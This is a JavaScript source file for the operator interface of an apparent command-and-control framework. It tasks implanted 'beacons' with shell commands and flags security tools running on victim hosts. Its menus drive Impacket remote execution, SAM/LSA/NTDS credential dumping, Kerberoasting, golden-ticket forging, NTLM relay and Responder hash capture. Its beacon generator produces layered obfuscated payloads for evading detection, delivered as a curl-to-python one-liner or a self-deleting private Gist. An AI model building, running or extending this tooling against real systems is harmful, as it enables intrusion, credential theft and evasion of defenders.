  {re:/clamd|clamscan|freshclam/i, name:"ClamAV", cat:"av", sev:"low"},
  {re:/WireShark|dumpcap|tshark/i, name:"Wireshark (Capture)", cat:"forensic", sev:"med"},
  {re:/velociraptor/i, name:"Velociraptor (DFIR)", cat:"forensic", sev:"high"},
  {re:/GRR|grr_agent/i, name:"GRR (DFIR)", cat:"forensic", sev:"high"},
];

const EDR_CAT_LABELS = {
  edr:"EDR", av:"AV", siem:"SIEM", ids:"IDS/IPS", audit:"Audit",
  scanner:"Scanner", forensic:"DFIR", rmm:"RMM"
};
const EDR_SEV_COLORS = {
  high:{bg:"rgba(255,50,50,0.15)",fg:"#ff5555"},
  med:{bg:"rgba(255,165,0,0.12)",fg:"#ffaa33"},
  low:{bg:"rgba(255,215,0,0.1)",fg:"#ffd700"}
};

function detectEDR(line){
  const hits = [];
  for(const e of EDR_DB){
    if(e.re.test(line)) hits.push(e);
  }
  return hits;
}

async function showProcs(){
  if(!selectedAgent) return;
  const procsCmd = 'ps aux 2>/dev/null || tasklist /v';
  await api("/api/agents/"+selectedAgent+"/task",{
    method:"POST", body:JSON.stringify({cmd:"shell", args:procsCmd, data:""})
  });
  openPanel("Processes", '<div class="t-pending">Waiting for agent...</div>');
  if(panelPollTimer) clearInterval(panelPollTimer);
  panelPollTimer = setInterval(() => pollProcsResult(procsCmd), 1500);
  pollHistory(selectedAgent);
}

async function pollProcsResult(procsCmd){
  if(!selectedAgent) return;
  const hist = await api("/api/agents/"+selectedAgent+"/history");
  const matches = hist.filter(h => h.cmd==="shell" && h.args===procsCmd);
  const last = matches[matches.length-1];
  if(!last || last.status==="pending" || last.status===null) return;
  if(panelPollTimer){ clearInterval(panelPollTimer); panelPollTimer=null; }
  const body = document.getElementById("panel-body");
  if(!body) return;
  if(last.status!=="ok"){ body.innerHTML='<div class="t-error">'+esc(last.output||"(error)")+'</div>'; return; }
  const info = await api("/api/agents/"+selectedAgent);
  const pid = info && info.pid ? String(info.pid) : null;
  const lines = (last.output||"").split("\n");

  const detectedTools = new Map();
  const flaggedLines = [];
  let beaconLine = null;

  for(const line of lines){
    if(!line.trim()) continue;
    const isBeacon = pid && line.match(new RegExp("(^|\\s)"+pid+"(\\s|$)"));
    const hits = detectEDR(line);
    if(isBeacon) beaconLine = line;
    hits.forEach(h => { if(!detectedTools.has(h.name)) detectedTools.set(h.name, h); });
    flaggedLines.push({line, isBeacon, hits});
  }

  let html = '';
  if(detectedTools.size > 0 || beaconLine){
    html += '<div class="proc-summary">';
    if(detectedTools.size > 0){
      html += '<div class="proc-alert"><span class="proc-alert-ico">🛡️</span><span class="proc-alert-title">Security Tools Detected ('+detectedTools.size+')</span></div>';
      html += '<div class="proc-detections">';
      for(const [name, e] of detectedTools){
        const sc = EDR_SEV_COLORS[e.sev];
        const catLabel = EDR_CAT_LABELS[e.cat]||e.cat;
        html += '<div class="proc-det" style="border-left:3px solid '+sc.fg+'">'
          +'<span class="proc-det-name">'+esc(name)+'</span>'
          +'<span class="proc-det-tag" style="background:'+sc.bg+';color:'+sc.fg+'">'+catLabel+'</span>'
          +'<span class="proc-det-sev" style="color:'+sc.fg+'">'+e.sev+'</span>'
          +'</div>';
      }
      html += '</div>';
    }
    if(beaconLine){
      html += '<div class="proc-beacon-info">🦝 Beacon PID '+esc(pid)+' found in process list</div>';
    }
    html += '</div>';
  }

  html += '<div class="proc-list">';
  const headerLine = flaggedLines.length > 0 && /^\s*(USER|PID|Image Name|%CPU|Name)/i.test(flaggedLines[0].line);
  for(let i=0; i<flaggedLines.length; i++){
    const {line, isBeacon, hits} = flaggedLines[i];
    if(i===0 && headerLine){
      html += '<div class="proc-line proc-header">'+esc(line)+'</div>';
      continue;
    }
    let cls = "proc-line";
    let suffix = "";
    if(isBeacon){ cls += " proc-beacon"; suffix = ' <span class="proc-tag beacon">BEACON</span>'; }
    if(hits.length){
      cls += " proc-flagged";
      suffix += hits.map(h => {
        const sc = EDR_SEV_COLORS[h.sev];
        return ' <span class="proc-tag" style="background:'+sc.bg+';color:'+sc.fg+'">'+esc(h.name)+'</span>';
      }).join("");
    }
    html += '<div class="'+cls+'">'+esc(line)+suffix+'</div>';
  }
  html += '</div>';
  body.innerHTML = html;
}

// ── AV/EDR enumeration ──
function runAvEnum(){
  showAvEnumDialog();
}

// ── Impacket menu ──
function showImpacketMenu(btn){
  let menu = document.getElementById("ipk-menu");
  if(menu){ menu.remove(); return; }
  menu = document.createElement("div");
  menu.id = "ipk-menu";
  menu.className = "nxc-menu";
  let html = '<div class="nxc-title">Impacket Tools</div>';
  html += '<div class="nxc-section">Target</div>';
  html += '<div class="nxc-host-pick">';
  html += '<input id="ipk-target" placeholder="IP or hostname" style="width:100%;padding:3px 6px;background:var(--bg2);color:var(--text);border:1px solid var(--border);border-radius:3px;font-size:11px">';
  html += '</div>';
  html += '<div class="nxc-host-pick" style="display:flex;gap:4px">';
  html += '<input id="ipk-user" placeholder="user" style="flex:1;padding:3px 6px;background:var(--bg2);color:var(--text);border:1px solid var(--border);border-radius:3px;font-size:11px">';
  html += '<input id="ipk-pass" placeholder="pass / hash" type="password" style="flex:1;padding:3px 6px;background:var(--bg2);color:var(--text);border:1px solid var(--border);border-radius:3px;font-size:11px">';
  html += '</div>';
  html += '<div class="nxc-host-pick"><label style="font-size:10px;color:var(--text2)"><input type="checkbox" id="ipk-hash"> Pass-the-Hash (-hashes)</label></div>';
  html += '<div class="nxc-section">Execution</div>';
  html += '<button onclick="ipkRun(\'psexec\')">PsExec (SYSTEM shell)</button>';
  html += '<button onclick="ipkRun(\'wmiexec\')">WMIExec (stealthier)</button>';
  html += '<button onclick="ipkRun(\'smbexec\')">SMBExec (no binary drop)</button>';
  html += '<button onclick="ipkRun(\'atexec\')">AtExec (scheduled task)</button>';
  html += '<button onclick="ipkRun(\'dcomexec\')">DcomExec (DCOM lateral)</button>';
  html += '<div class="nxc-section">Credential Dumping</div>';
  html += '<button onclick="ipkRun(\'secretsdump\')">SecretsDump (SAM/LSA/NTDS)</button>';
  html += '<button onclick="ipkRun(\'lsassy\')">Lsassy (LSASS remote)</button>';
  html += '<div class="nxc-section">Enumeration</div>';
  html += '<button onclick="ipkRun(\'samrdump\')">SAMRDump (users/groups)</button>';
  html += '<button onclick="ipkRun(\'lookupsid\')">LookupSID (SID enum)</button>';
  html += '<button onclick="ipkRun(\'reg\')">Reg.py (remote registry)</button>';
  html += '<button onclick="ipkRun(\'GetADUsers\')">GetADUsers</button>';
  html += '<button onclick="ipkRun(\'GetUserSPNs\')">GetUserSPNs (Kerberoast)</button>';
  html += '<button onclick="ipkRun(\'GetNPUsers\')">GetNPUsers (AS-REP roast)</button>';
  html += '<div class="nxc-section">Relay & Coercion</div>';
  html += '<button onclick="showRelayKingDialog()">👑 RelayKing (relay audit)</button>';
  html += '<button onclick="showResponderDialog()">📡 Responder (poison)</button>';
  html += '<button onclick="ipkRun(\'ntlmrelayx\')">NTLMRelayx</button>';
  html += '<button onclick="ipkRun(\'smbserver\')">SMBServer (share files)</button>';
  html += '<button onclick="ipkRun(\'ticketer\')">Ticketer (golden/silver)</button>';
  html += '<div class="nxc-section">Custom</div>';
  html += '<div class="nxc-custom"><input id="ipk-custom" placeholder="e.g. secretsdump.py domain/user:pass@target" style="width:100%"><button onclick="ipkCustomRun()">Run</button></div>';
  html += '<div class="nxc-note">Runs on C2 server (not beacon). Requires Docker container.</div>';
  menu.innerHTML = html;
  btn.parentElement.style.position = "relative";
  btn.parentElement.appendChild(menu);
  document.addEventListener("click", function closeIpk(e){
    if(!e.target.closest("#ipk-menu") && !e.target.closest("[onclick*=showImpacketMenu]")){
      const m = document.getElementById("ipk-menu");
      if(m) m.remove();
      document.removeEventListener("click", closeIpk);
    }
  });
}

function ipkBuildAuth(){
  const user = document.getElementById("ipk-user")?.value?.trim() || "";
  const pass = document.getElementById("ipk-pass")?.value?.trim() || "";
  const isHash = document.getElementById("ipk-hash")?.checked;
  if(!user) return "";
  if(isHash && pass) return user + " -hashes :" + pass;
  if(pass) return user + ":" + pass;
  return user;
}

async function ipkRun(tool){
  const target = document.getElementById("ipk-target")?.value?.trim();
  if(!target){ toast("warn","Impacket","Enter target IP/hostname",3000); return; }
  const auth = ipkBuildAuth();
  document.getElementById("ipk-menu")?.remove();

  const cmdMap = {
    psexec: "impacket-psexec",
    wmiexec: "impacket-wmiexec",
    smbexec: "impacket-smbexec",
    atexec: "impacket-atexec",
    dcomexec: "impacket-dcomexec",
    secretsdump: "impacket-secretsdump",
    lsassy: "lsassy",
    samrdump: "impacket-samrdump",
    lookupsid: "impacket-lookupsid",
    reg: "impacket-reg",
    GetADUsers: "impacket-GetADUsers",
    GetUserSPNs: "impacket-GetUserSPNs",
    GetNPUsers: "impacket-GetNPUsers",
    ntlmrelayx: "impacket-ntlmrelayx",
    smbserver: "impacket-smbserver SHARE /tmp/share",
    ticketer: "impacket-ticketer",
  };
  const binary = cmdMap[tool] || "impacket-"+tool;
  const fullCmd = auth ? binary + " " + auth + "@" + target : binary + " " + target;
  toast("info","Impacket","Running: "+tool+" → "+target,4000);
  await api("/api/server/exec", {
    method:"POST",
    body:JSON.stringify({cmd: fullCmd, tool: tool})
  });
  openPanel("Impacket: "+tool, '<div class="t-pending">Running '+esc(tool)+' against '+esc(target)+'...</div>');
  if(panelPollTimer) clearInterval(panelPollTimer);
  panelPollTimer = setInterval(() => pollServerExec(tool), 2000);
}

function ipkCustomRun(){
  const args = document.getElementById("ipk-custom")?.value?.trim();
  if(!args){ toast("warn","Impacket","Enter command",3000); return; }
  document.getElementById("ipk-menu")?.remove();
  toast("info","Impacket","Running: "+args,4000);
  api("/api/server/exec", {
    method:"POST",
    body:JSON.stringify({cmd: args, tool: "custom"})
  });
  openPanel("Impacket: custom", '<div class="t-pending">Running command...</div>');
  if(panelPollTimer) clearInterval(panelPollTimer);
  panelPollTimer = setInterval(() => pollServerExec("custom"), 2000);
}

async function pollServerExec(tool){
  const result = await api("/api/server/exec/result");
  if(!result || result.status === "running") return;
  if(panelPollTimer){ clearInterval(panelPollTimer); panelPollTimer=null; }
  const body = document.getElementById("panel-body");
  if(!body) return;
  if(result.status === "ok"){
    body.innerHTML = '<div class="t-output">'+esc(result.output||"(no output)")+'</div>';
  } else {
    body.innerHTML = '<div class="t-error">'+esc(result.output||"(error)")+'</div>';
  }
}

// ── AV/EDR Remote Enum (server-side via Impacket) ──
function showAvEnumDialog(){
  document.getElementById("nxc-menu")?.remove();
  document.getElementById("ipk-menu")?.remove();
  const overlay = document.createElement("div");
  overlay.className = "loot-overlay";
  overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
  const panel = document.createElement("div");
  panel.className = "loot-panel";
  panel.style.minWidth = "360px";
  panel.innerHTML = '<h2>🛡️ Remote AV/EDR Enumeration</h2>'
    +'<button class="loot-close" onclick="this.closest(\'.loot-overlay\').remove()">✕</button>'
    +'<p style="font-size:11px;color:var(--text2);margin:0 0 12px">Scans a remote host via SMB using Impacket — detects installed AV/EDR via LsarLookupNames (unprivileged), named pipes, and SCM.</p>'
    +'<div class="avenum-form">'
    +'<label>Target <input id="ave-target" placeholder="10.0.0.5"></label>'
    +'<label>Domain <input id="ave-domain" placeholder="." value="."></label>'
    +'<label>Username <input id="ave-user" placeholder="guest"></label>'
    +'<label>Password / Hash <input id="ave-pass" type="password" placeholder="(empty for null session)"></label>'
    +'<label class="ave-check"><input type="checkbox" id="ave-hash"> Pass-the-Hash (NTLM hash)</label>'
    +'<button class="ave-run" onclick="runAvEnumRemote()">🛡️ Scan</button>'
    +'</div>';
  overlay.appendChild(panel);
  document.body.appendChild(overlay);
}

async function runAvEnumRemote(){
  const target = document.getElementById("ave-target")?.value?.trim();
  if(!target){ toast("warn","AV Enum","Enter target IP/hostname",3000); return; }
  const domain = document.getElementById("ave-domain")?.value?.trim() || ".";
  const user = document.getElementById("ave-user")?.value?.trim() || "";
  const pass = document.getElementById("ave-pass")?.value || "";
  const useHash = document.getElementById("ave-hash")?.checked || false;
  document.querySelector(".loot-overlay")?.remove();
  toast("info","AV Enum","Scanning "+target+"...",4000);
  await api("/api/server/avenum", {
    method:"POST",
    body:JSON.stringify({target, username:user, password:pass, domain, use_hash:useHash})
  });
  openPanel("AV/EDR: "+target, '<div class="t-pending">Enumerating endpoint protection on '+esc(target)+'...</div>');
  if(panelPollTimer) clearInterval(panelPollTimer);
  panelPollTimer = setInterval(() => pollServerExec("avenum"), 2000);
}

// ── RelayKing dialog ──
function showRelayKingDialog(){
  document.getElementById("ipk-menu")?.remove();
  const overlay = document.createElement("div");
  overlay.className = "loot-overlay";
  overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
  const panel = document.createElement("div");
  panel.className = "loot-panel";
  panel.style.minWidth = "420px";
  panel.innerHTML = '<h2>👑 RelayKing — NTLM Relay Audit</h2>'
    +'<button class="loot-close" onclick="this.closest(\'.loot-overlay\').remove()">✕</button>'
    +'<p style="font-size:11px;color:var(--text2);margin:0 0 12px">Scans for NTLM relay opportunities across SMB, LDAP, HTTP, MSSQL. Identifies signing, EPA, channel binding, Ghost SPNs, NTLMv1.</p>'
    +'<div class="avenum-form">'
    +'<label>Target(s) <input id="rk-target" placeholder="10.0.0.0/24, hostname, or IP range"></label>'
    +'<label>Domain <input id="rk-domain" placeholder="domain.local"></label>'
    +'<label>DC IP <input id="rk-dcip" placeholder="(for --audit / Kerberos)"></label>'
    +'<div style="display:flex;gap:8px">'
    +'<label style="flex:1">Username <input id="rk-user" placeholder="user"></label>'
    +'<label style="flex:1">Password <input id="rk-pass" type="password" placeholder="pass"></label>'
    +'</div>'
    +'<div class="nxc-section" style="padding:8px 0 4px">Protocols</div>'
    +'<div style="display:flex;gap:8px;flex-wrap:wrap;font-size:11px">'
    +'<label class="ave-check"><input type="checkbox" id="rk-smb" checked> SMB</label>'
    +'<label class="ave-check"><input type="checkbox" id="rk-ldap" checked> LDAP</label>'
    +'<label class="ave-check"><input type="checkbox" id="rk-ldaps" checked> LDAPS</label>'
    +'<label class="ave-check"><input type="checkbox" id="rk-http"> HTTP</label>'
    +'<label class="ave-check"><input type="checkbox" id="rk-https"> HTTPS</label>'
    +'<label class="ave-check"><input type="checkbox" id="rk-mssql"> MSSQL</label>'
    +'</div>'
    +'<div class="nxc-section" style="padding:8px 0 4px">Options</div>'
    +'<div style="display:flex;gap:8px;flex-wrap:wrap;font-size:11px">'
    +'<label class="ave-check"><input type="checkbox" id="rk-audit"> --audit (all AD computers)</label>'
    +'<label class="ave-check"><input type="checkbox" id="rk-portscan"> --proto-portscan</label>'
    +'<label class="ave-check"><input type="checkbox" id="rk-ntlmv1"> --ntlmv1</label>'
    +'<label class="ave-check"><input type="checkbox" id="rk-genrelay" checked> --gen-relay-list</label>'
    +'<label class="ave-check"><input type="checkbox" id="rk-coerce"> --coerce-all</label>'
    +'</div>'
    +'<label>Threads <input id="rk-threads" value="10" style="width:60px"></label>'
    +'<label>Extra args <input id="rk-extra" placeholder="e.g. -vv --no-ghosts"></label>'
    +'<button class="ave-run" onclick="runRelayKing()">👑 Run RelayKing</button>'
    +'</div>';
  overlay.appendChild(panel);
  document.body.appendChild(overlay);
}

async function runRelayKing(){
  const target = document.getElementById("rk-target")?.value?.trim();
  const domain = document.getElementById("rk-domain")?.value?.trim();
  const dcip = document.getElementById("rk-dcip")?.value?.trim();
  const user = document.getElementById("rk-user")?.value?.trim();
  const pass = document.getElementById("rk-pass")?.value;
  const threads = document.getElementById("rk-threads")?.value?.trim() || "10";
  const extra = document.getElementById("rk-extra")?.value?.trim() || "";
  const audit = document.getElementById("rk-audit")?.checked;

  if(!target && !audit){ toast("warn","RelayKing","Enter target or enable --audit",3000); return; }

  const protos = [];
  if(document.getElementById("rk-smb")?.checked) protos.push("smb");
  if(document.getElementById("rk-ldap")?.checked) protos.push("ldap");
  if(document.getElementById("rk-ldaps")?.checked) protos.push("ldaps");
  if(document.getElementById("rk-http")?.checked) protos.push("http");
  if(document.getElementById("rk-https")?.checked) protos.push("https");
  if(document.getElementById("rk-mssql")?.checked) protos.push("mssql");

  let cmd = "python3 /opt/RelayKing/relayking.py";
  if(user) cmd += " -u " + user;
  if(pass) cmd += " -p '" + pass.replace(/'/g,"'\\''") + "'";
  if(domain) cmd += " -d " + domain;
  if(dcip) cmd += " --dc-ip " + dcip;
  if(!user && !pass) cmd += " --null-auth";
  if(protos.length) cmd += " --protocols " + protos.join(",");
  cmd += " --threads " + threads;
  if(audit) cmd += " --audit";
  if(document.getElementById("rk-portscan")?.checked) cmd += " --proto-portscan";
  if(document.getElementById("rk-ntlmv1")?.checked) cmd += " --ntlmv1";
  if(document.getElementById("rk-genrelay")?.checked) cmd += " --gen-relay-list /data/raccoon-c2/relay-targets.txt";
  if(document.getElementById("rk-coerce")?.checked) cmd += " --coerce-all";
  cmd += " -o plaintext";
  if(extra) cmd += " " + extra;
  if(target) cmd += " " + target;

  document.querySelector(".loot-overlay")?.remove();
  toast("info","RelayKing","Scanning for relay opportunities...",5000);
  await api("/api/server/exec", {
    method:"POST",
    body:JSON.stringify({cmd, tool:"relayking"})
  });
  openPanel("RelayKing", '<div class="t-pending">Running RelayKing relay audit...<br><span style="font-size:10px;color:var(--text2)">This may take several minutes for large subnets.</span></div>');
  if(panelPollTimer) clearInterval(panelPollTimer);
  panelPollTimer = setInterval(() => pollServerExec("relayking"), 3000);
}

// ── Responder dialog ──
function showResponderDialog(){
  document.getElementById("ipk-menu")?.remove();
  const overlay = document.createElement("div");
  overlay.className = "loot-overlay";
  overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
  const panel = document.createElement("div");
  panel.className = "loot-panel";
  panel.style.minWidth = "400px";
  panel.innerHTML = '<h2>📡 Responder — LLMNR/NBT-NS/mDNS Poisoner</h2>'
    +'<button class="loot-close" onclick="this.closest(\'.loot-overlay\').remove()">✕</button>'
    +'<p style="font-size:11px;color:var(--text2);margin:0 0 12px">Poisons LLMNR, NBT-NS, and mDNS to capture Net-NTLM hashes. Use Analyze mode (-A) first to observe traffic without poisoning.</p>'
    +'<div class="avenum-form">'
    +'<label>Interface <input id="rsp-iface" placeholder="eth0" value="eth0"></label>'
    +'<div class="nxc-section" style="padding:8px 0 4px">Mode</div>'
    +'<div style="display:flex;gap:8px;flex-wrap:wrap;font-size:11px">'
    +'<label class="ave-check"><input type="radio" name="rsp-mode" value="analyze" checked> Analyze (-A, passive)</label>'
    +'<label class="ave-check"><input type="radio" name="rsp-mode" value="poison"> Poison (active)</label>'
    +'</div>'
    +'<div class="nxc-section" style="padding:8px 0 4px">Options</div>'
    +'<div style="display:flex;gap:8px;flex-wrap:wrap;font-size:11px">'
    +'<label class="ave-check"><input type="checkbox" id="rsp-wpad"> WPAD proxy (-w)</label>'
    +'<label class="ave-check"><input type="checkbox" id="rsp-force-wpad"> Force WPAD auth (-F)</label>'
    +'<label class="ave-check"><input type="checkbox" id="rsp-verbose"> Verbose (-v)</label>'
    +'</div>'
    +'<label>Extra args <input id="rsp-extra" placeholder="e.g. --lm --disable-ess"></label>'
    +'<button class="ave-run" onclick="runResponder()">📡 Start Responder</button>'
    +'<div class="nxc-note" style="margin-top:8px">⚠ Poison mode will actively intercept network traffic. Use Analyze first. Requires host networking (--net=host).</div>'
    +'</div>';
  overlay.appendChild(panel);
  document.body.appendChild(overlay);
}

async function runResponder(){
  const iface = document.getElementById("rsp-iface")?.value?.trim() || "eth0";
  const mode = document.querySelector('input[name="rsp-mode"]:checked')?.value || "analyze";
  const extra = document.getElementById("rsp-extra")?.value?.trim() || "";

  let cmd = "python3 /opt/Responder/Responder.py -I " + iface;
  if(mode === "analyze") cmd += " -A";
  if(document.getElementById("rsp-wpad")?.checked) cmd += " -w";
  if(document.getElementById("rsp-force-wpad")?.checked) cmd += " -F";
  if(document.getElementById("rsp-verbose")?.checked) cmd += " -v";
  if(extra) cmd += " " + extra;

  document.querySelector(".loot-overlay")?.remove();
  toast("info","Responder","Starting in " + mode + " mode on " + iface,4000);
  await api("/api/server/exec", {
    method:"POST",
    body:JSON.stringify({cmd, tool:"responder"})
  });
  openPanel("Responder ("+mode+")", '<div class="t-pending">Responder running in '+esc(mode)+' mode on '+esc(iface)+'...<br><span style="font-size:10px;color:var(--text2)">Capturing hashes... Poll results below.</span></div>');
  if(panelPollTimer) clearInterval(panelPollTimer);
  panelPollTimer = setInterval(() => pollServerExec("responder"), 3000);
}

// ── Beacon Generator ──
async function showBeaconGen(){
  const cfg = await api("/api/server/config");
  const gistCheck = await api("/api/server/beacon-gist/check");
  const proto = cfg.ssl ? "https" : "http";
  const defaultUrl = proto+"://"+location.hostname+":"+cfg.port+"/api/v1/beacon";
  const ghOk = gistCheck.available;
  const overlay = document.createElement("div");
  overlay.className = "loot-overlay";
  overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
  const panel = document.createElement("div");
  panel.className = "loot-panel";
  panel.style.minWidth = "480px";
  panel.style.maxWidth = "600px";
  panel.innerHTML = '<h2>\u{1F680} Beacon Generator</h2>'
    +'<button class="loot-close" onclick="this.closest(\'.loot-overlay\').remove()">✕</button>'
    +'<p style="font-size:11px;color:var(--text2);margin:0 0 12px">Generate an obfuscated Python beacon payload. Multiple compression and encoding layers make static detection harder.</p>'
    +'<div class="avenum-form">'
    +'<label>C2 Callback URL <input id="bg-url" value="'+esc(defaultUrl)+'" placeholder="https://c2.example.com:8443/api/v1/beacon"></label>'
    +'<label>Encryption Key (base64) <input id="bg-key" value="'+esc(cfg.enc_key)+'" placeholder="auto-filled from server config"></label>'
    +'<div style="display:flex;gap:8px">'
    +'<label style="flex:1">Interval (sec) <input id="bg-interval" value="300" type="number" min="10" max="86400"></label>'
    +'<label style="flex:1">Jitter (%) <input id="bg-jitter" value="20" type="number" min="0" max="90"></label>'
    +'</div>'
    +'<div class="bgen-layers">'
    +'<span style="font-size:11px;color:var(--text2);white-space:nowrap">Obfuscation Layers</span>'
    +'<input type="range" id="bg-layers" min="1" max="6" value="3" oninput="document.getElementById(\'bg-lval\').textContent=this.value">'
    +'<span class="bgen-lval" id="bg-lval">3</span>'
    +'</div>'
    +'<div class="nxc-section" style="padding:8px 0 4px">Delivery Method</div>'
    +'<div class="bgen-delivery">'
    +'<label class="bgen-dlabel"><input type="radio" name="bg-delivery" value="inline" checked> <span>Inline one-liner</span></label>'
    +'<label class="bgen-dlabel'+(ghOk?'':' disabled')+'"><input type="radio" name="bg-delivery" value="gist"'+(ghOk?'':' disabled')+'> <span>GitHub Gist'+(ghOk?' ✔':' (gh CLI not available)')+'</span></label>'
    +'</div>'
    +'<div id="bg-gist-opts" style="display:none">'
    +'<label>Gist filename <input id="bg-gist-fn" value="update.py" placeholder="update.py"></label>'
    +'<p style="font-size:10px;color:var(--text2);margin:2px 0 0">Creates a private gist. Auto-deletes when an agent connects.</p>'
    +'</div>'
    +'<div style="display:flex;gap:8px;align-items:center">'
    +'<button class="ave-run" style="flex:1" onclick="runBeaconGen()">\u{1F680} Generate Payload</button>'
    +'<button class="c2pe-profile-btn" style="padding:6px 12px;border-radius:4px;cursor:pointer;font-size:11px;border:1px solid;background:none;font-family:inherit" onclick="showC2ProfileEditor()">&#128737; C2 Profile</button>'
    +'<span id="bg-profile-status" style="font-size:9px;color:var(--text2)"></span>'
    +'</div>'
    +'<div id="bg-result"></div>'
    +'<button class="bgen-flow-toggle" onclick="this.classList.toggle(\'open\')"><span class="chevron">&#9654;</span> Pipeline Flow</button>'
    +'<div class="bgen-flow-wrap"><div class="bflow">'
    +'<div class="bflow-node active"><span class="bflow-icon">\u{1F680}</span><div class="bflow-body"><div class="bflow-title">Beacon Generator</div><div class="bflow-desc">Configure URL, key, interval, jitter, obfuscation layers</div></div></div>'
    +'<div class="bflow-arrow"><div class="bflow-arrow-line"></div><svg width="8" height="6"><path d="M4 6L0 0h8z" fill="currentColor" opacity="0.3"/></svg></div>'
    +'<div class="bflow-node profile" onclick="showC2ProfileEditor()"><span class="bflow-icon">\u{1F6E1}</span><div class="bflow-body"><div class="bflow-title">C2 Profile Editor</div><div class="bflow-desc">Syntax highlighting, tutorial, linter — click to open</div></div></div>'
    +'<div class="bflow-arrow"><div class="bflow-arrow-line"></div><svg width="8" height="6"><path d="M4 6L0 0h8z" fill="currentColor" opacity="0.3"/></svg></div>'
    +'<div class="bflow-or"><div class="bflow-or-line"></div><span class="bflow-or-badge">3 input paths</span><div class="bflow-or-line"></div></div>'
    +'<div class="bflow-arrow"><svg width="8" height="6"><path d="M4 6L0 0h8z" fill="currentColor" opacity="0.3"/></svg></div>'
    +'<div class="bflow-split">'
    +'<div class="bflow-node"><span class="bflow-icon">\u{1F4C4}</span><div class="bflow-body"><div class="bflow-title">Template</div><div class="bflow-desc">Azure/CDN preset</div></div></div>'
    +'<div class="bflow-node burp" onclick="showC2ProfileEditor();setTimeout(showBurpImport,300)"><span class="bflow-icon">\u{1F50D}</span><div class="bflow-body"><div class="bflow-title">Burp Import</div><div class="bflow-desc">Paste raw HTTP</div></div></div>'
    +'<div class="bflow-node"><span class="bflow-icon">\u{270F}</span><div class="bflow-body"><div class="bflow-title">Manual</div><div class="bflow-desc">Write profile</div></div></div>'
    +'</div>'
    +'<div class="bflow-arrow"><div class="bflow-arrow-line"></div><svg width="8" height="6"><path d="M4 6L0 0h8z" fill="currentColor" opacity="0.3"/></svg></div>'
    +'<div class="bflow-node lint"><span class="bflow-icon">\u{26A1}</span><div class="bflow-body"><div class="bflow-title">Lint &amp; Validate</div><div class="bflow-desc">Syntax, braces, transforms, required fields</div></div></div>'
    +'<div class="bflow-arrow"><div class="bflow-arrow-line"></div><svg width="8" height="6"><path d="M4 6L0 0h8z" fill="currentColor" opacity="0.3"/></svg></div>'
    +'<div class="bflow-node gen"><span class="bflow-icon">\u{1F3AF}</span><div class="bflow-body"><div class="bflow-title">Generate Payload</div><div class="bflow-desc">Multi-layer obfuscation → inline or GitHub Gist</div></div></div>'
    +'<div class="bflow-arrow"><div class="bflow-arrow-line"></div><svg width="8" height="6"><path d="M4 6L0 0h8z" fill="currentColor" opacity="0.3"/></svg></div>'
    +'<div class="bflow-or"><div class="bflow-or-line"></div><span class="bflow-or-badge">delivery</span><div class="bflow-or-line"></div></div>'
    +'<div class="bflow-arrow"><svg width="8" height="6"><path d="M4 6L0 0h8z" fill="currentColor" opacity="0.3"/></svg></div>'
    +'<div class="bflow-split">'
    +'<div class="bflow-node gen"><span class="bflow-icon">\u{1F4CB}</span><div class="bflow-body"><div class="bflow-title">Inline</div><div class="bflow-desc">curl | python3</div></div></div>'
    +'<div class="bflow-node gen"><span class="bflow-icon">\u{1F517}</span><div class="bflow-body"><div class="bflow-title">GitHub Gist</div><div class="bflow-desc">Private, auto-delete</div></div></div>'
    +'</div>'
    +'</div></div>'
    +'</div>';
  overlay.appendChild(panel);
  document.body.appendChild(overlay);
  document.querySelectorAll('input[name="bg-delivery"]').forEach(r => {
    r.addEventListener("change", () => {
      document.getElementById("bg-gist-opts").style.display = r.value==="gist" && r.checked ? "block" : "none";
    });
  });
  api("/api/server/c2-profile/active").then(d => {
    const el = document.getElementById("bg-profile-status");
    if(!el) return;
    if(d.active){
      const cfg = d.config || {};
      const nGet = (cfg.http_get?.uris||[]).length;
      const nPost = (cfg.http_post?.uris||[]).length;
      el.innerHTML = '<span style="color:var(--green)">✔ Profile active</span>';
      if(nGet||nPost) el.innerHTML += ` (${nGet+nPost} URIs)`;
    } else {
      el.textContent = "No profile — using default evasion";
    }
  }).catch(()=>{});
}

async function runBeaconGen(){
  const url = document.getElementById("bg-url")?.value?.trim();
  if(!url){ toast("warn","Beacon Gen","Enter the C2 callback URL",3000); return; }
  const delivery = document.querySelector('input[name="bg-delivery"]:checked')?.value || "inline";
  if(delivery==="gist") return runBeaconGist();
  const key = document.getElementById("bg-key")?.value?.trim() || "";
  const interval = document.getElementById("bg-interval")?.value || "300";
  const jitter = document.getElementById("bg-jitter")?.value || "20";
  const layers = document.getElementById("bg-layers")?.value || "3";
  const btn = document.querySelector(".ave-run");
  if(btn){ btn.disabled=true; btn.textContent="Generating..."; }
  try{
    const data = await api("/api/server/beacon-gen", {
      method:"POST",
      body:JSON.stringify({c2_url:url, enc_key:key, interval, jitter, layers})
    });
    if(data.error){ toast("err","Beacon Gen",data.error,4000); return; }
    const container = document.getElementById("bg-result");
    if(!container) return;
    container.innerHTML =
      '<div class="bgen-result">'
      +'<div class="bgen-tab-bar">'
      +'<button class="bgen-tab active" onclick="bgenTab(this,\'unix\')">Linux / macOS</button>'
      +'<button class="bgen-tab" onclick="bgenTab(this,\'win\')">Windows</button>'
      +'<button class="bgen-tab" onclick="bgenTab(this,\'deob\')">\u{1F50D} Deobfuscate</button>'
      +'</div>'
      +'<div class="bgen-code" id="bg-code">'+esc(data.oneliner_unix)+'</div>'
      +'<div id="bg-deob" style="display:none"></div>'
      +'<div class="bgen-meta" id="bg-meta">'
      +'<span>\u{1F510} '+data.layers+' obfuscation layers</span>'
      +'<span>\u{1F4E6} '+Math.round(data.size/1024)+' KB payload</span>'
      +'<span>\u{1F4C4} '+Math.round(data.raw_size/1024)+' KB source</span>'
      +'</div>'
      +'<button class="bgen-copy" onclick="bgenCopy()">\u{1F4CB} Copy to Clipboard</button>'
      +'</div>';
    container._unix = data.oneliner_unix;
    container._win = data.oneliner_win;
    container._deob = data.deob;
    toast("ok","Beacon Gen","Payload generated ("+data.layers+" layers)",3000);
  }catch(e){
    toast("err","Beacon Gen","Generation failed: "+e.message,4000);
  }finally{
    if(btn){ btn.disabled=false; btn.textContent="\u{1F680} Generate Payload"; }
  }
}

async function runBeaconGist(){
  const url = document.getElementById("bg-url")?.value?.trim();
  const key = document.getElementById("bg-key")?.value?.trim() || "";
